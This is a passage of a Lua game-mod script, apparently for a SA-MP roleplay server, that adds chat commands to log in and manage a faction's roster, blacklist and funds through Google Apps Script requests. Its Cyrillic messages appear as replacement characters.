		-- local vec_b = {["x"] = x - myX, ["y"] = y - myY, ["z"] = z - myZ}
		-- local vec_c = {["x"] = (vec_a.y * vec_b.z) - (vec_a.z * vec_b.y), ["y"] = (vec_a.z * vec_b.x) - (vec_a.x * vec_b.z), ["z"] = (vec_a.x * vec_b.y) - (vec_a.y * vec_b.x)}
		-- --print("�������: " .. vec_a.z .. ";" .. vec_c.z .. "")
		-- if (vec_c.z > 0 and vec_a.z > 0) or (vec_c.z < 0 and vec_a.z < 0) then return deg else return -1 * deg end
end

function getcars()
		local chandles = {}
		local tableIndex = 1
		local vehicles = getAllVehicles()
		local fcarhandle = isCharInAnyCar(PLAYER_PED) and storeCarCharIsInNoSave(PLAYER_PED) or 12
		for k, v in pairs(vehicles) do
				if doesVehicleExist(v) and v ~= fcarhandle then table.insert(chandles, v) end
		end

		if table.maxn (chandles) == 0 then return nil else return chandles end
end

function cmd_balogin(sparams)
	lua_thread.create(function()
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� /balogin [������].", 0xffff0000) return end
		local result, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
		local nick = sampGetPlayerNickname(myid)
						--lvl = access
		local responsetext = req('https://script.google.com/macros/s/AKfycbx28UFg93in4xEHLnLjBPF-3BXRNddlNiiW0RARAZ-hHvu3kwo/exec?do=login&nick=' .. nick .. '&p=' .. sparams .. '')
		local re1 = regex.new("@@.@ (Access granted|Registration successfully)\\. Level\\: (\\d) @.@.@") --
		local response, lvll = re1:match(responsetext)
		if response == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ����� ��� ������.", 0xffff0000) return end
		if response == "Registration successfully" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� ������ ���������� �������.", 0xffff0000) end
		access.alevel = tonumber(lvll)
		moderpas = "modernick=" .. nick .. "&p=" .. sparams .. ""
		
		if access.alevel > 0 then
			sampRegisterChatCommand("lek", cmd_lek)
			sampRegisterChatCommand("pcheck", cmd_pcheck)
			sampRegisterChatCommand("tren", cmd_tren)
		end

		if access.alevel > 1 then
			sampRegisterChatCommand("padd", cmd_padd)
			sampRegisterChatCommand("pdel", cmd_pdel)									
			sampRegisterChatCommand("mark", cmd_mark)
			sampRegisterChatCommand("add", cmd_add)
			sampRegisterChatCommand("del", cmd_del)
			sampRegisterChatCommand("change", cmd_change)
		end

		if access.alevel > 2 then
			sampRegisterChatCommand("otm", cmd_otm)
		end

		if access.alevel == 3 or access.alevel == 6 then 
			sampRegisterChatCommand("fond", cmd_fond) 
			fond[2] = getPlayerMoney(PLAYER_HANDLE)
			local responsetext = req("https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=fond&act=ref&" .. moderpas .. "")
			local re1 = regex.new("\\@\\@\\.\\@ L\\: (.*) \\@\\@\\.\\.\\@\\.\\@") --
			local names = re1:match(responsetext)
			if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ����� ����� ������.", 0xffff0000) else fond[1] = names end 
		end
		
		if access.alevel > 4 then
			sampRegisterChatCommand("reg", cmd_reg)
			sampRegisterChatCommand("ban", cmd_ban)
			sampRegisterChatCommand("moder", cmd_moder)
		end
		
		if config_ini.bools[58] == 1 and access.alevel ~= 3 and access.alevel ~= 6 then config_ini.bools[58] = 0 inicfg.save(config_ini, "config") end
		sendtolog("�������� ����������� � �������� ����������", 1.1)
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. nick .. " - �������� ����������� � �������� ���������� ������ " .. access.alevel .. ".", 0xffff0000)
	end)
end


function cmd_check()
		lua_thread.create(
				function()
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ����� �������.", 0xffff0000)
						local responsetext = req('https://script.google.com/macros/s/AKfycbya8zAQ_EMWg9pp2mFEh5XbKVym-nJEMlbc-fyayvN932cPAvQ/exec?do=check&' .. moderpas .. '')
						local re1 = regex.new("@##@ (.*) @@@@##@@") --
						local names = re1:match(responsetext)
						if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ������ #1.", 0xffff0000) return end
						local namesarr = string.split(names, "; ")
						for k, v in pairs(namesarr) do
								local id = sampGetPlayerIdByNickname(v)
								if id ~= nil then
										local clist = string.sub(string.format('%x', sampGetPlayerColor(id)), 3)
										local clist = clist == "ffff" and "fffafa" or clist
										sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}{" .. clist .. "}" .. v .. "[" .. tostring(id) .. "]{fffafa} - � ����", 0xffff0000)
								end
						end
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ����� �������.", 0xffff0000)
				end
		)
end

function cmd_reg(sparams)
		lua_thread.create(
				function()
						if access.alevel < 5 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
						if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /reg [id] [T-������/M-�������� ������/H - �������� ����]", 0xFFFF0000) return end
						local params = {}
						for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
						local id = -1
						if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
						if id ~= -1 and not sampIsPlayerConnected(tonumber(params[1])) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
						local nick = id == -1 and params[1] or sampGetPlayerNickname(tonumber(params[1]))

						if params[2] ~= "T" and params[2] ~= "M" and params[2] ~= "H" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /reg [id] [T-������/M-�������� ������/H - �������� ����]", 0xFFFF0000) return end
						if params[2] == "H" and access.alevel < 3 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������������ ���� ��� ������ ������� ��������� �����.", 0xffff0000) return end
						local part = params[2] == "T" and "0" or params[2] == "H" and "2" or "1"
						local responsetext = req('https://script.google.com/macros/s/AKfycbwBG17iJ1Jpy5Ft9lmACSIZyrOA7QBydzgM1S12jkARF7ddEWA/exec?do=add&name=' .. nick .. '&part=' .. part .. '&' .. moderpas .. '')
						local re1 = regex.new("@@# Updated @#@") --
						local names = re1:match(responsetext)
						if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��� ��������������� � �������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ������ " .. nick .. " � ������� ��� ��������.", 0xffff0000) end
				end
		)
end

function cmd_ban(sparams)
		lua_thread.create(
				function()
						if access.alevel < 5 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
						if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /ban [id]", 0xFFFF0000) return end
						local params = {}
						for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
						local id = -1
						if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
						if id ~= -1 and not sampIsPlayerConnected(tonumber(params[1])) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
						local nick = id == -1 and params[1] or sampGetPlayerNickname(tonumber(params[1]))
						local responsetext = req('https://script.google.com/macros/s/AKfycbwBG17iJ1Jpy5Ft9lmACSIZyrOA7QBydzgM1S12jkARF7ddEWA/exec?do=find&name=' .. nick .. '&del=3YxEKPHYQI&' .. moderpas .. '')
						local re1 = regex.new("Row deleted") --
						local names = re1:match(responsetext)
						if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������� ������ � ������ " .. nick .. ".", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ � ������� � ������ " .. nick .. " ��� ����������.", 0xffff0000) end
				end
		)
end

function cmd_fond(sparams)
	lua_thread.create(function()
		if access.alevel ~= 3 and access.alevel ~= 6 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� /fond [bank/withdraw [��� �������/������] [����� (��� �����)] [����������] / balance - �������� ����� ����� ��� �������]", 0xFFFF0000) return end
		local params = {}
		for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
		if params[1] == nil or (params[1] ~= "bank" and params[1] ~= "withdraw" and params[1] ~= "balance") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� /fond [bank/withdraw/balance]", 0xFFFF0000) return end
		if (params[1] == "bank" or params[1] == "withdraw") then
			if params[2] == nil or params[2] == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ���", 0xFFFF0000) return end
			if params[3] == nil or params[3] == "" or tonumber(params[3]) == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �����", 0xFFFF0000) return end
			if params[4] == nil or params[4] == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ����������", 0xFFFF0000) return end
		end
		

		local responsetext = req("https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=fond&act=" .. (params[1] == "balance" and "balance" or "" .. params[1] .. "&who=" .. translit(params[2]) .. "&m=" .. params[3] .. "&prim=" .. translit(strrest(params, 4)) .. "") .. "&" .. moderpas .. "")
		local re1 = regex.new("\\@\\@\\.\\@ L\\: (.*) \\@\\@\\.\\.\\@\\.\\@") --
		local names = re1:match(responsetext)
		if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ����� ����� ������.", 0xffff0000) else fond[1] = names sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� ����� ������ ������� ���������.", 0xffff0000) end 
	end)
end

function cmd_otm()
	lua_thread.create(function()
		if access.alevel < 3 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
		
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ���� ����������...", 0xFFFF0000)
		local responsetext = req("https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=getlist")
		local str = responsetext:match("%@%@%.%@ (.*) %@%@%.%.%@%.%@")
		local rukstr = str:match("(.*) @@....@") -- ���-��
		if rukstr ~= nil then for k, v in ipairs(rukstr:split("; ")) do local a = v:split(" ") soptlist[1][a[1]  .. "_" .. a[2]] = 0 end end
				
		local osnstr = str:match("@@....@ (.*) @@...@") -- �������� ������
		if osnstr ~= nil then for k, v in ipairs(osnstr:split("; ")) do local a = v:split(" ") soptlist[1][a[1]  .. "_" .. a[2]] = 0 end end
					
		local stjstr = str:match("@@...@ (.*)") -- �������
		if stjstr ~= nil then for k, v in ipairs(stjstr:split("; ")) do local a = v:split(" ") soptlist[1][a[1]  .. "_" .. a[2]] = 0 end end
		
		
		otmmode = true 
		sampSendChat("/offmfilter clear") wait(500) sampSendChat("/offmembers")				
		while otmmode do wait(0) end

		local names = ""
		local otms = ""
		for k, v in pairs(soptlist[1]) do 
			local f, s = k:match("(.*)%_(.*)") 
			names = names == "" and "" .. f .. "%20" .. s .. "" or "" .. names .. "@.@" .. f .. "%20" .. s .. ""
			otms = otms == "" and v or "" .. otms .. "@.@" .. v .. ""
		end
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���� ���������� ��������. ������� ��������� ������ � �������...", 0xFFFF0000)
		
		local responsetext = req("https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=otm&names=" .. names .. "&otms=" .. otms .. "&" .. moderpas .. "")
		local re1 = regex.new("@@.@ Update complete @@..@.@") --
		local names = re1:match(responsetext)
		if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ������� � ������� ������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� � ������� ������ ������� ���������.", 0xffff0000) end 
		return 
	end)		
end

function cmd_tren(sparams)
	lua_thread.create(function()
		if access.alevel < 1 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� /tren [�������] [���������� ���������] [���������� �����������] [��������� (1-3)] [������������� �����������]", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}1 - ������, 2 - ������ ��, 3 - ���������", 0xFFFF0000) return end
		local params = {}
		for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
		if params[1] == nil or params[2] == nil or params[3] == nil or params[4] == nil or params[5] == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� /tren [�������] [���������� ���������] [���������� �����������] [��������� (1-3)] [������������� �����������]", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}1 - ������, 2 - ������ ��, 3 - ���������", 0xFFFF0000) return end
		
		local responsetext = req("https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=tren&vic=" .. params[4] .. "&where=" .. translit(params[1]) .. "&we=" .. params[2] .. "&they=" .. params[3] .. "&who=" .. translit(strrest(params, 5)) .. "&" .. moderpas .. "")
		local re1 = regex.new("@@.@ Complete @@..@.@") --
		local names = re1:match(responsetext)
		if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ���������� ����� � ���������� ���������� � ������� ������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� � ���������� ���������� ������� ����������� � ������� ������.", 0xffff0000) end 
		return 
	end)
end

function cmd_pcheck(sparams)
	lua_thread.create(
			function()
					if access.alevel < 1 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
					sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ����� " .. (sparams == "-1" and "���� ������������� �������" or "������������� ������� � ����") .. ".", 0xffff0000)
					local Members1Text = getMembersText()
					local members = {}
					for v in Members1Text:gmatch('[^\n]+') do local nickname, zv = v:match("%[%d+%] %[%d+%] (%a+%_%a+)	(%W*) %[.*%]") if zv ~= nil then members[nickname] = zv end end
					local responsetext = req('https://script.google.com/macros/s/AKfycbw2mSf730dll2c7GedYaEplttqdTRmZY48sc05c7TDsHBPCv-Rf/exec?do=check&' .. moderpas .. '')
					local re1 = regex.new("@##@ @@..@ NAMES: (.*) @@@@##@@") --
					local names = re1:match(responsetext)
					if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ������ #1.", 0xffff0000) return end
					local namesarr = string.split(names, "; ")
					for k, v in pairs(namesarr) do
						local dd, nn, prim, who = v:match("(.*) %@%=%@ (.*) %@%=%=%@ (.*) %@%=%=%=%@ (.*)")
						local id = sampGetPlayerIdByNickname(nn)
						if id ~= nil then
							local clist = string.sub(string.format('%x', sampGetPlayerColor(id)), 3)
							local clist = clist == "ffff" and "fffafa" or clist
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}{" .. clist .. "}" .. nn .. "[" .. tostring(id) .. "] - " .. (members[nn] ~= nil and members[nn] or "����������") .. "{008000} - � ����{fffafa} - " .. prim .. "", 0xffff0000)
							sampAddChatMessage("{FF0000}[LUA]: {FFA500}�������: {fffafa}" .. who .. ", " .. dd .. "", 0xffff0000)
						else
							if sparams == "-1" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. nn .. "{F08080} - �� � ����{fffafa} - " .. prim .. "", 0xffff0000) sampAddChatMessage("{FF0000}[LUA]: {FFA500}�������: {fffafa}" .. who .. ", " .. dd .. "", 0xffff0000) end
						end
					end
					sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ����� �������.", 0xffff0000)
			end
	)
end

function cmd_padd(sparams)
		lua_thread.create(
				function()
						if access.alevel < 2 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
						if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /padd [id/nick] ([����������])", 0xFFFF0000) return end
						local params = {}
						for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
						local id = -1
						if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
						if id ~= -1 and not sampIsPlayerConnected(tonumber(params[1])) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
						local nick = id == -1 and params[1] or sampGetPlayerNickname(tonumber(params[1]))
						local responsetext = req('https://script.google.com/macros/s/AKfycbw2mSf730dll2c7GedYaEplttqdTRmZY48sc05c7TDsHBPCv-Rf/exec?do=add&name=' .. nick .. '' .. (params[2] ~= nil and '&text=' .. translit(strrest(params, 2)) .. '' or '') .. '&who=' .. sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))) .. '&date=' .. os.date("%d.%m.%Y") .. '&' .. moderpas .. '')
						local re1 = regex.new("@@.@ (.*) @.@@") --
						local names = re1:match(responsetext)
						if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ������ " .. nick .. " � ������ �������������.", 0xffff0000) return end
						
						if names:match("Done") ~= nil then
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��� �������� � ������ �������������.", 0xffff0000)
							return
						end

						if names:match("False V") ~= nil then
							local res, who, date = names:match("False V%: (.*)%; (.*)%; (.*)")
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��������� � {FF0000}�� ��������.", 0xffff0000)
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� {FF0000}" .. res .. " {FFFAFA}�������: {FF0000}" .. who .. " " .. date .. ".", 0xffff0000)
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ������ � ������������� ��� ����������� �� �����?", 0xffff0000)
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� Y - ��� ��������, N - ��� ������. {FF0000}��� �������� ����� ����� ������ �� �� ��������!", 0xffff0000)
							while true do wait(0) if isKeyDown(vkeys.VK_Y) then break end if isKeyDown(vkeys.VK_N) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ������ " .. nick .. " � ������ �������������.", 0xffff0000) return end end

							local responsetext = req('https://script.google.com/macros/s/AKfycbw2mSf730dll2c7GedYaEplttqdTRmZY48sc05c7TDsHBPCv-Rf/exec?do=add&name=' .. nick .. '' .. (params[2] ~= nil and '&text=' .. translit(strrest(params, 2)) .. '' or '') .. '&who=' .. sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))) .. '&date=' .. os.date("%d.%m.%Y") .. '&ignorev=1&' .. moderpas .. '')
							local re1 = regex.new("@@.@ (.*) @.@@") --
							local names = re1:match(responsetext)

							if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ������ " .. nick .. " � ������ �������������.", 0xffff0000) return end
							if names:match("Done") ~= nil then
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��� ������� �� �� ��������.", 0xffff0000)
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��� �������� � ������ �������������.", 0xffff0000)
								return
							end
						end

						if names:match("False BL") ~= nil then
							local res, who = names:match("False BL%: (.*)%; (.*)")
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��������� � {FF0000}�� ������.", 0xffff0000)
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� {FF0000}" .. res .. " {FFFAFA}�������: {FF0000}" .. who .. ".", 0xffff0000)
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ������ " .. nick .. " � ������ �������������.", 0xffff0000)
						end
				end
		)
end

function cmd_pdel(sparams)
		lua_thread.create(
				function()
						if access.alevel < 2 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
						if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /pdel [id/nick] ([������� ��������� � �� ��������])", 0xFFFF0000) return end
						local params = {}
						for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
						local id = -1
						if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
						if id ~= -1 and not sampIsPlayerConnected(tonumber(params[1])) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
						local nick = id == -1 and params[1] or sampGetPlayerNickname(tonumber(params[1]))
						local reasonchs = params[2] ~= nil and strrest(params, 2) or ""
						local responsetext = req('https://script.google.com/macros/s/AKfycbw2mSf730dll2c7GedYaEplttqdTRmZY48sc05c7TDsHBPCv-Rf/exec?do=delete&name=' .. nick .. '&' .. moderpas .. '' .. (params[2] ~= nil and '&chs=1&reason=' .. translit(strrest(params, 2)) .. '&who=' .. sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))) .. '&date=' .. os.date("%d.%m.%Y") .. '' or '') .. '')
						local re1 = regex.new("@@.@ Row deleted") --
						local names = re1:match(responsetext)
						if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������� ������ " .. nick .. " �� ������ �������������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��� ������ �� ������ �������������.", 0xffff0000) end
				end
		)
end

function cmd_add(sparams) 
		lua_thread.create(function()
			if access.alevel < 2 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
			if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /add [id] ([���� ���������� ��������� � ������� dd.mm.yyyy])", 0xFFFF0000) return end
			local params = {}
			for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
			local id = -1
			if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
			if id == -1 or (id ~= -1 and not sampIsPlayerConnected(tonumber(params[1]))) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
			local nick = sampGetPlayerNickname(tonumber(params[1]))

			local Members1Text = getMembersText()
			for v in Members1Text:gmatch('[^\n]+') do
				local _, zv, afk = v:match("%[%d+%] %[(%d+)%] " .. nick .. "	(%W*) %[%d+%](.*)")
				if zv ~= nil then
					local reg = regex.new("(.*)\\_(.*)") --
					local fname, sname = reg:match(nick)
					local nickname = "" .. fname .. " " .. sname .. ""
					
					local data = params[2] ~= nil and params[2] or os.date("%d.%m.%Y")
			
					sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ����������� ������� � ������� ������ ������ {ff0000}" .. nickname .. "", 0xFFFF0000)
					sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ������: {ff0000}" .. zv .. "{fffafa}, ���� ���������� ���������: {ff0000}" .. data .. ".", 0xFFFF0000)
					sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� Y ��� ������������� � N ��� ������.", 0xFFFF0000)
					while true do wait(0) if isKeyDown(vkeys.VK_Y) then break end if isKeyDown(vkeys.VK_N) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������.", 0xFFFF0000) return end end
					
					local result, logmyid = sampGetPlayerIdByCharHandle(PLAYER_PED)
					local lognick = sampGetPlayerNickname(logmyid)
					local responsetext = req('https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=add&nick=' .. nickname .. '&rank=' .. translit(zv) .. '&date=' .. data .. '&who=' .. lognick .. '&' .. moderpas .. '')
					local re1 = regex.new("@@.@ Add complete @@..@.@") --
					local names = re1:match(responsetext)
					if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ������ " .. nick .. " � ������� ������.", 0xffff0000) return end
				
					local responsetext = req('https://script.google.com/macros/s/AKfycbw2mSf730dll2c7GedYaEplttqdTRmZY48sc05c7TDsHBPCv-Rf/exec?do=delete&name=' .. nick .. '&' .. moderpas .. '')
					local re2 = regex.new("@@.@ Row deleted") --
					local names2 = re2:match(responsetext)
					if names2 == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������� ������ " .. nick .. " �� ������ �������������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��� ������ �� ������ �������������.", 0xffff0000) end
					sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��� ������� �������� � ������� ������.", 0xffff0000) 
					return 
				end
			end

			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. nick .. "[" .. id .. "] {FFFAFA}- �� ������ � members", 0xFFFF0000) return
		end)
end

function cmd_del(sparams) 
	lua_thread.create(function()
		if access.alevel < 2 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /del [id] ([������� ��������� � ��])", 0xFFFF0000) return end
		local params = {}
		for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
		local id = -1
		if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
		if (id ~= -1 and not sampIsPlayerConnected(tonumber(params[1]))) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
		local nick = id == -1 and params[1] or sampGetPlayerNickname(tonumber(params[1]))
		local reg = regex.new("(.*)\\_(.*)") --
		local fname, sname = reg:match(nick)
		local nickname = "" .. fname .. " " .. sname .. ""
					
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ����������� ������� �� ������� ������ ������ {ff0000}" .. nickname .. "", 0xFFFF0000)
		if params[2] ~= nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}� ���������� � �� � ��������: {ff0000}" .. strrest(params, 2) .. ".", 0xFFFF0000) end
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� Y ��� ������������� � N ��� ������.", 0xFFFF0000)
		while true do wait(0) if isKeyDown(vkeys.VK_Y) then break end if isKeyDown(vkeys.VK_N) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������.", 0xFFFF0000) return end end
					
		local chs = params[2] ~= nil and 1 or 0
		local reason = params[2] ~= nil and strrest(params, 2) or "123"
		local result, logmyid = sampGetPlayerIdByCharHandle(PLAYER_PED)
		local lognick = sampGetPlayerNickname(logmyid)
		local responsetext = req('https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=find&nick=' .. nickname .. '&del=3YxEKPHYQI&chs=' .. chs .. '&who=' .. lognick .. '&reason=' .. translit(reason) .. '&' .. moderpas .. '')
		local re1 = regex.new("@@.@ Row deleted (BL )?@@..@.@") --
		local names = re1:match(responsetext)
		if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������� ������ " .. nick .. " �� ������� ������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��� ������� ������ �� ������� ������.", 0xffff0000) end 
		return 
	end)
end

function cmd_lek(sparams) 
	lua_thread.create(function()
		if access.alevel < 1 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
		
		if sparams == "" then 
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /lek [id] [pmp/rb/np/tp/nv/no]", 0xFFFF0000)
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}pmp - ������ ���. ������, rb - ��������������, np - ������ �������������", 0xFFFF0000)
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}tp - ����������� ����������, nv - ������ ��������, no - ������ ��������������", 0xFFFF0000)
			return 
		end
		
		local params = {}
		for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
		local id = -1
		if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
		if (id ~= -1 and not sampIsPlayerConnected(tonumber(params[1]))) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
		local nick = id == -1 and params[1] or sampGetPlayerNickname(tonumber(params[1]))
		if params[2] ~= "pmp" and params[2] ~= "rb" and params[2] ~= "np" and params[2] ~= "tp" and params[2] ~= "nv" and params[2] ~= "no" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������� ������.", 0xFFFF0000) return end
		local reg = regex.new("(.*)\\_(.*)") --
		local fname, sname = reg:match(nick)
		local nickname = "" .. fname .. " " .. sname .. ""
					
		local responsetext = req('https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=lek&nick=' .. nickname .. '&wto=' .. params[2] .. '&' .. moderpas .. '')
		local re1 = regex.new("@@.@ Update complete @@..@.@") --
		local names = re1:match(responsetext)
